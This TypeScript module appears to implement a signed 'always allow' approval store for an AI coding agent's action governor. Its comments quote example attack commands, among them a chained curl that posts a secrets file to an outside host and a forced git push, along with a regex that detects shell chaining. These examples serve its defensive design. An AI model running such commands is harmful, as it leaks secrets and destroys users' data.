import { createHmac, timingSafeEqual } from 'node:crypto'
import { existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join } from 'node:path'
import type { ActionAssessment, ActionRequest } from './governor.ts'
import { userPreauthSecret } from './preauth.ts'
import { isHashTrusted, sha256Hex, trustHash, TRUST_HINT } from './projectTrust.ts'
import { noteCorruptState } from '../localJson.ts'

/**
 * A persistent "always allow" list — the counterpart to `.elia/policy.json`.
 *
 * `policy.json` can only ever *tighten* the governor. This store is the other
 * direction: it records a human's explicit "yes, and stop asking me" for a class
 * of action, so the supervised approval prompt does not reappear every turn.
 *
 * Two scopes, mirroring what a person actually means when they click that:
 *   - `project` → `.elia/allow.json`, versioned with the repo (a team decision)
 *   - `global`  → `~/.config/elia/allow.json`, this machine only (a personal
 *     habit, alongside the preauth trust stores)
 *
 * A rule is deliberately narrow. For `run_command` it is keyed to the leading
 * token of the command (`git`, `npm`, `New-Item`) — approving `git status` once
 * does not wave through `git push`. For every other tool it is keyed to the tool
 * name plus the governor's `intent`, so "always allow edit_file" cannot silently
 * also mean "always allow github.push".
 *
 * The per-user store is signed. Its rules are exactly the standing authority
 * that lets a later run skip an approval, so an unsigned or edited file is
 * refused rather than honored: the `mac` is an HMAC-SHA256 over the rules array
 * keyed by the same per-user secret that signs pre-authorizations
 * (preauth.ts), which only this machine's own `--authorize`/approval flow can
 * produce. That is what makes the governor's "parent-signs-the-child" boundary
 * real for this store: a shell mishap, a dropped-in repo, or anyone else who
 * can write the file cannot grant themselves a permanent bypass.
 *
 * The project file is inside the repo, so it cannot vouch for itself: a cloned
 * repository could otherwise ship `{"rules":[{"tool":"run_command","commandPrefix":"curl"}]}`
 * and hand its author standing approvals in the victim's unattended runs. Its
 * rules are honoured only while the user-level trust record
 * (autonomy/projectTrust.ts — `elia trust`, or the "always allow" prompt
 * writing the rule itself) covers the file's *current* SHA-256; any other
 * content is ignored, like an unsigned per-user file. policy.json's invariant
 * stays: a repo may only ever tighten governance, never hand out standing
 * approvals.
 */
export interface AllowRule {
  /** Tool name: `run_command`, `edit_file`, `github`, … */
  tool: string
  /** For command tools: the leading executable token this rule covers. */
  commandPrefix?: string
  /** Governor intent (`edit_file.write`, `github.push`) — narrows non-command tools. */
  intent?: string
  /** ISO timestamp the rule was added. */
  addedAt: string
  /** Free-text note (the assessment reason at the time), for humans reading the file. */
  note?: string
}

export type AllowScope = 'project' | 'global'

interface AllowFile {
  rules: AllowRule[]
  /** HMAC-SHA256 over the rules array with the per-user preauth secret — an
   * allow file a repo (or a shell mishap) can write is verified, not trusted. */
  mac?: string
}

const MAX_RULES = 500

export function allowPath(scope: AllowScope, cwd = process.cwd()): string {
  if (scope === 'project') return join(cwd, '.elia', 'allow.json')
  // The per-user store lives under ~/.config/elia (the same home the preauth
  // trust stores relocated to), never inside a checked-out repo's `.elia`.
  // Tests isolate this with ELIA_ALLOW_GLOBAL_PATH — and on win32,
  // os.homedir() reads %USERPROFILE%, not $HOME, so the usual "just set
  // $HOME" trick silently does nothing there.
  return process.env.ELIA_ALLOW_GLOBAL_PATH || join(homedir(), '.config', 'elia', 'allow.json')
}

/**
 * The pre-relocation location (~/.elia/allow.json); read once to migrate.
 * ELIA_ALLOW_LEGACY_PATH is the test seam for that (mirroring
 * preauth.ts): with ELIA_ALLOW_GLOBAL_PATH set, a test must never consume —
 * let alone delete — the real machine's ~/.elia/allow.json.
 */
function legacyGlobalAllowPath(): string {
  return process.env.ELIA_ALLOW_LEGACY_PATH ?? join(homedir(), '.elia', 'allow.json')
}

/** True when a legacy ~/.elia/allow.json may be migrated into the active one. */
function legacyMigrationAllowed(): boolean {
  return !process.env.ELIA_ALLOW_GLOBAL_PATH || process.env.ELIA_ALLOW_LEGACY_PATH !== undefined
}

function signRules(rules: AllowRule[]): string {
  return createHmac('sha256', userPreauthSecret()).update(JSON.stringify(rules)).digest('hex')
}

function verifies(file: AllowFile): boolean {
  if (typeof file.mac !== 'string' || file.mac.length === 0) return false
  const expected = signRules(file.rules)
  try {
    return timingSafeEqual(Buffer.from(file.mac, 'hex'), Buffer.from(expected, 'hex'))
  } catch {
    return false
  }
}

interface Cached {
  mtimeMs: number
  file: AllowFile
}
const cache = new Map<string, Cached>()
const EMPTY: AllowFile = { rules: [] }
const untrustedNoticed = new Set<string>()

/** Says once per file content that a project allow file is being ignored, and how to trust it. */
function noteUntrustedProjectAllow(path: string, sha: string): void {
  const key = `${path}:${sha}`
  if (untrustedNoticed.has(key)) return
  untrustedNoticed.add(key)
  process.stderr.write(`elia: ignoring the standing approvals in ${path} — it has not been trusted (or it changed since). ${TRUST_HINT}.\n`)
}

function load(path: string): AllowFile {
  // One-time migration: a pre-relocation ~/.elia/allow.json predates signing;
  // it was written by this machine's own earlier elia, so carry the rules
  // across once — as a freshly signed store — rather than silently dropping
  // the operator's standing approvals.
  if (path === allowPath('global', process.cwd()) && !existsSync(path)) {
    const legacy = legacyGlobalAllowPath()
    if (legacy && legacy !== path && legacyMigrationAllowed() && existsSync(legacy)) {
      try {
        mkdirSync(dirname(path), { recursive: true, mode: 0o700 })
        const rules = readLegacyRules(legacy)
        writeFileSync(path, `${JSON.stringify({ rules, mac: signRules(rules) }, null, 2)}\n`, { mode: 0o600 })
        rmSync(legacy, { force: true })
      } catch {
        /* migration is best effort; the store just starts empty */
      }
    }
  }
  if (!existsSync(path)) {
    cache.delete(path)
    return EMPTY
  }
  let mtimeMs = 0
  try {
    mtimeMs = statSync(path).mtimeMs
  } catch {
    return EMPTY
  }
  const isGlobal = path === allowPath('global', process.cwd())
  // A project file is re-read and re-hashed on every call: its trust is bound
  // to the exact bytes, so an mtime cache would let a same-timestamp edit ride
  // on an earlier verdict.
  const hit = isGlobal ? cache.get(path) : undefined
  if (hit && hit.mtimeMs === mtimeMs) return hit.file
  let file: AllowFile = EMPTY
  try {
    const text = readFileSync(path, 'utf8')
    const parsed = JSON.parse(text) as unknown
    if (parsed && typeof parsed === 'object' && Array.isArray((parsed as AllowFile).rules)) {
      const raw = parsed as AllowFile
      // The per-user global store must verify; the repo's project store must
      // match a hash the user has trusted (see the header comment).
      if (isGlobal && !verifies(raw)) {
        noteCorruptState('allowStore.verify', path, new Error('allow.json failed its HMAC verification — refusing the rules'), { keepCopy: true })
        file = EMPTY
      } else if (!isGlobal && !isHashTrusted(path, sha256Hex(text))) {
        noteUntrustedProjectAllow(path, sha256Hex(text))
        file = EMPTY
      } else {
        file = {
          rules: raw.rules
            .filter((r): r is AllowRule => Boolean(r) && typeof r.tool === 'string')
            .slice(0, MAX_RULES),
        }
      }
    }
  } catch (error) {
    // A malformed allow.json loosens nothing — treat it as empty rather than
    // throw, but say so: otherwise the person's rules just stop applying.
    noteCorruptState('allowStore.read', path, error, { keepCopy: true })
    file = EMPTY
  }
  if (isGlobal) cache.set(path, { mtimeMs, file })
  return file
}

/** Rules from a pre-signing allow.json, coerced to its shape without a mac. */
function readLegacyRules(path: string): AllowRule[] {
  const parsed = JSON.parse(readFileSync(path, 'utf8')) as unknown
  if (!parsed || typeof parsed !== 'object' || !Array.isArray((parsed as AllowFile).rules)) return []
  return (parsed as AllowFile).rules
    .filter((r): r is AllowRule => Boolean(r) && typeof r.tool === 'string')
    .slice(0, MAX_RULES)
}

/**
 * Shell control syntax that lets one command chain onto another (`bun run x &
 * curl …`), pipe into an interpreter, redirect files, or substitute output.
 * A rule keyed to the leading token must never come to cover those.
 */
const COMMAND_CHAIN_SYNTAX = /[;&|<>`$]|\$\(/i

/**
 * Whether approving this request can be persisted as a standing *prefix* rule.
 * A `run_command` rule is keyed to the leading token only, so persisting one for
 * a command that chains further work behind shell control syntax (`&`, `;`, `|`,
 * redirects, `$`, command substitution) would auto-allow a much wider class than
 * the approver actually saw — a single `bun` approval would come to cover
 * `bun run x & curl -X POST example.com -d @secrets.txt`, and `git` would come
 * to cover `git push --force origin main`. Such approvals are honored for the
 * session/run only and never persisted.
 */
export function canPersistPrefixRule(request: ActionRequest): boolean {
  const command = shellCommandOf(request)
  return command === undefined || !COMMAND_CHAIN_SYNTAX.test(command)
}

/**
 * The shell command line a request runs, for the tools whose rules are keyed to
 * its leading token: run_command, and `process start`, which runs the same kind
 * of command without waiting for it. Undefined for every other request — a
 * `process` rule keyed to an intent like `shell.unknown` would auto-allow every
 * command the governor doesn't recognise.
 */
function shellCommandOf(request: ActionRequest): string | undefined {
  if (request.name !== 'run_command' && !(request.name === 'process' && request.input.action === 'start')) return undefined
  return typeof request.input.command === 'string' ? request.input.command : ''
}

/** The leading token of a shell command — `git push --force` → `git`. */
export function commandPrefix(command: string): string {
  const trimmed = command.trim().replace(/^[(!{]\s*/, '')
  const first = trimmed.split(/[\s;|&]+/, 1)[0]!
  // Keep a path-qualified binary readable: ./gradlew → gradlew, C:\x\node.exe → node.exe
  return first.replace(/\\/g, '/').split('/').filter(Boolean).pop() ?? first
}

/** A direct program's executable plus its first operation-defining argument. */
function directProgramPrefix(input: Record<string, unknown>): string {
  const program = typeof input.program === 'string' ? commandPrefix(input.program) : ''
  const firstArg = Array.isArray(input.args) && typeof input.args[0] === 'string' ? input.args[0].trim() : ''
  return [program, firstArg].filter(Boolean).join(' ')
}

function matches(rule: AllowRule, request: ActionRequest, assessment: ActionAssessment): boolean {
  // "Always allow changes to elia's own source" means every file tool, not only
  // the one that happened to ask.
  if (rule.intent === 'self_edit') return assessment.intent === 'self_edit'
  if (rule.tool !== request.name) return false
  const command = shellCommandOf(request)
  if (command !== undefined) {
    // A persisted prefix rule was approved for a single leading token. A
    // command that chains further work behind shell control syntax reaches
    // far beyond that token (`bun` must not cover `bun run x & curl … -d
    // @secrets.txt`, `git` must not cover `git reset --hard; git push --force`),
    // so it must never ride in on a prefix rule — prompt instead.
    if (COMMAND_CHAIN_SYNTAX.test(command)) return false
    return Boolean(rule.commandPrefix) && commandPrefix(command) === rule.commandPrefix
  }
  if (request.name === 'run_program') {
    const prefix = directProgramPrefix(request.input)
    const prefixMatches = Boolean(rule.commandPrefix) && prefix === rule.commandPrefix
    return prefixMatches && (!rule.intent || rule.intent === assessment.intent)
  }
  return !rule.intent || rule.intent === assessment.intent
}

/** True when a persisted rule (project or global) already permits this action. */
export function isAllowlisted(request: ActionRequest, assessment: ActionAssessment, cwd = process.cwd()): boolean {
  const rules = [...load(allowPath('project', cwd)).rules, ...load(allowPath('global', cwd)).rules]
  return rules.some((rule) => matches(rule, request, assessment))
}

/** Builds the rule an approval prompt would persist for this request. */
export function ruleFor(request: ActionRequest, assessment: ActionAssessment): AllowRule {
  const base: AllowRule = { tool: request.name, addedAt: new Date().toISOString(), note: assessment.reason }
  const command = shellCommandOf(request)
  if (command !== undefined) return { ...base, commandPrefix: commandPrefix(command) }
  if (request.name === 'run_program') return { ...base, commandPrefix: directProgramPrefix(request.input), intent: assessment.intent }
  return { ...base, intent: assessment.intent }
}

/** A short human label for what a rule covers — for the approval menu. */
export function ruleLabel(rule: AllowRule): string {
  if (rule.commandPrefix) return `\`${rule.commandPrefix}\` commands`
  if (rule.intent === 'self_edit') return "changes to elia's own source"
  return `\`${rule.tool}\``
}

export function addAllowRule(rule: AllowRule, scope: AllowScope, cwd = process.cwd()): void {
  const path = allowPath(scope, cwd)
  const file = load(path)
  const duplicate = file.rules.some(
    (r) => r.tool === rule.tool && r.commandPrefix === rule.commandPrefix && r.intent === rule.intent,
  )
  const rules: AllowRule[] = duplicate ? file.rules : [...file.rules, rule].slice(-MAX_RULES)
  const next: AllowFile = scope === 'global' ? { rules, mac: signRules(rules) } : { rules }
  const text = `${JSON.stringify(next, null, 2)}\n`
  // The person just chose "always allow" (or this is their own `elia trust`
  // flow): trust exactly what is about to be written, so their rule works
  // without a second step. `file` came from load(), which already dropped any
  // untrusted rules a repo shipped, so they are not blessed along with it.
  mkdirSync(dirname(path), { recursive: true, mode: 0o700 })
  if (scope === 'project') trustHash(path, sha256Hex(text))
  writeFileSync(path, text, { mode: 0o600 })
  cache.delete(path)
}

/** Test seam. */
export function clearAllowCache(): void {
  cache.clear()
}
